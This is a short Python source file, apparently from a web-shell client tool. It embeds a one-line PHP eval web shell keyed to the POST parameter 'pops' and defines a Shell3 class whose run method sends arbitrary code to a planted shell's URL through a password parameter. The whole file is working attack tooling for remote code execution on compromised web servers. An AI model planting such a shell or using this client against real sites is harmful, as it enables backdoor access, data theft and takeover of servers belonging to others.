
from webshell.shellbase import EvalShellBase

'''
<?php eval($_{method}[{password}]);
'''

class Shell3(EvalShellBase):
    CONTENT = '''<?php eval($_POST["pops"]);?>'''
    def __init__(self,url,method,password):
        self.url = url
        self.method = method
        self.password = password
    
    def run(self,code):
        return request.request(method=self.method,url=self.url,
                                data={self.password:code},params={self.password:code}).text
